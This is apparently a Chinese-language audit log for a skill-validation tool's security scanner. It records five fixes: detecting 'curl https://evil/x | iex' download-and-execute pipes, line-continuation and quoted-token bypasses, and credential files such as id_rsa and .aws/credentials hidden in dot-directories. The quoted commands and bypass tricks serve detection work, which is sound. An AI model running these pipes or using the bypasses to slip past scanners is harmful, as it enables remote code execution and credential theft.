# 审计闭环：第七轮对抗式交叉验证（安全扫描绕过 + 孪生缺口）

## 基本信息
- 日期：2026-09-10
- 版本：skill-creator 0.9.20 → 0.9.21
- 触发来源：对「两成品已达标」结论做**最终独立交叉验证**——不再重走相同清单，而是主动构造同类变体与换角度攻击面（安全绕过、孪生不对称、隐藏目录覆盖），逐条运行期实证。

## 本轮新发现并修复（skill 侧 5 项）

1. **curl/wget 管道未含 `iex`/`invoke-expression`（中，安全绕过，孪生不对称）**：PowerShell 中 `curl`/`wget` 是 `Invoke-WebRequest` 别名，`curl https://evil/x | iex` 是真实的下载即执行链。agent 侧已于第二轮把 `iex` 并入 curl/wget 的 shell 集合，但 skill 侧 `utils.py` 从未同步 → 实证 `find_dangerous_pipes` 返回 0（agent 返回 1）。修复：并入同一集合。
2. **PowerShell 反引号 / CMD 脱字符续行绕过（中，安全）**：`curl x ` + 换行 + `| iex`（反引号续行）、`curl x ^` + 换行 + `| cmd`（cmd 续行）把管道拆到两行，逐行正则漏检。修复：在 `find_dangerous_pipes` 归一化阶段合并续行；**仅当续行后紧跟 `|` 时合并**，避免吞掉 Markdown 围栏首行的反引号。
3. **引号/子壳包裹的 shell token 绕过（中，安全）**：`curl x | "bash"`、`curl x | (bash)`、`curl x | $(bash)` 的右侧 token 带引号/括号，原逐 token 精确比较漏检。修复：新增 `_normalize_token` 剥离配对的引号与 `(`/`$(`/`)` 包裹；`| grep "(bash)"` 仍不误报。
4. **无扩展名凭据文件漏扫（中，覆盖缺口，孪生不对称）**：`_is_scannable_text` 只特判 `.env`/`.env.*`，未覆盖 agent 侧已有的 `SENSITIVE_DOTFILES`（`id_rsa`/`.npmrc`/`.git-credentials`/`.netrc`…）。实证只扫出 `.env` 一条。修复：引入同名单表并补 `credentials`、`.gitconfig`、`.bashrc`、`.zshrc`、`.profile`、`.bash_profile`、`.secrets` 等无扩展名凭据文件。
5. **隐藏目录整体跳过（中，安全覆盖缺口，双孪生）**：`check_dir_secrets` 跳过 `.` 开头目录，而凭据常驻 `.ssh/`、`.aws/` → 捆绑的 `.ssh/id_rsa`、`.aws/credentials` 完全不可见。实证 0 命中。修复：安全扫描改为下钻隐藏目录，仅跳过 VCS/缓存噪声（`SECURITY_SKIP_DIRS`：`.git`/`.hg`/`.svn`/`__pycache__`/`node_modules`/`.venv` 等）。定义发现仍跳过 dotdir，不受影响。

## 修复过程中的回归（发现并纠正）

- 初版把「反引号续行」做无条件合并，误吞了围栏首行 ` ``` ` 的末字节 → `fenced_ranges` 失效、所有围栏内危险管道集体漏检（探针立现 `curl|bash` 由 1 变 0）。纠正为 `(?<!`)`(?!`)[ \t]*\r?\n[ \t]*(?=\|)`：仅单反引号且下一行以 `|` 开头时才合并。这条作为「修复引入回归需用探针复核」的实例保留。

## 采纳要点（改了什么）

- `scripts/utils.py`：curl/wget shell 集合增 `iex`/`invoke-expression`；`find_dangerous_pipes` 合并 PowerShell/CMD 续行；新增 `_normalize_token` 并用于 `_segment_runs_shell`。
- `scripts/validate_skills.py`：新增 `SENSITIVE_DOTFILES` 与 `SECURITY_SKIP_DIRS`；`_is_scannable_text` 接入名单；`check_dir_secrets` 下钻隐藏目录。
- 测试：`tests/test_hardening.py` +5 例 → **166 例**（原 161）。
- 同步 `.opencode/skills/skill-creator` 镜像（`utils.py`/`validate_skills.py`/`SKILL.md` + 本记录）。
- 版本 0.9.20 → 0.9.21。

## 验证结果

- `python -m pytest tests/ -q`：**166 passed**。
- 成品 strict / 能力库 strict（5）/ agent strict（32）/ `build_catalog.py --check` 全绿；索引 4 源 2187 条完整性 OK。
- 运行期探针：5 类绕过由「漏检 0」变为「检出 1」；10 个 benign 用例（`grep bash`、`command -v`、`tee`、`jq`、`python -c "bash"`、内联代码反引号 + 表格等）零误报。

## 学习点

- **孪生两侧必须逐一对照**：同一安全逻辑两份实现，agent 第二轮修了 `iex`/dotfile，skill 侧却一直缺失——「另一侧看起来更完整」不等于「这一侧没有缺口」。
- **续行符是一整类绕过**：`\`、PowerShell `` ` ``、CMD `^` 语义等价；按字面只处理一种必然漏，且新增续行规则时必须用围栏/内联代码做误报回归。
- **「已达标」需要换角度证伪**：本轮的 5 项全部落在前六轮未覆盖的「隐藏目录 / shell 语法等价类 / 孪生差额」，证明独立交叉验证仍能推翻「无缺陷」结论。
